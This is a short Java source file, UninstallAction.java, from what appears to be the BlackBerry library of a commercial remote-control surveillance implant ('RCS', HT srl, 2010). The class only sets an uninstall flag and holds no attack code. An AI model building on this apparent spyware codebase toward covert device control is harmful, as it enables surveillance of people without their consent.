/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : UninstallAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import com.ht.rcs.blackberry.utils.Check;

public class UninstallAction extends SubAction {

    public UninstallAction(int actionId, byte[] confParams) {
        super(actionId);
        Parse(confParams);

        Check.requires(ActionId == ACTION_UNINSTALL, "ActionId scorretto");

    }

    public UninstallAction(String host) {
        super(ACTION_UNINSTALL);

    }

    protected boolean Parse(byte[] confParams) {

        return true;
    }

    public boolean Execute() {

        this.wantUninstall = true;
        return false;
    }

}
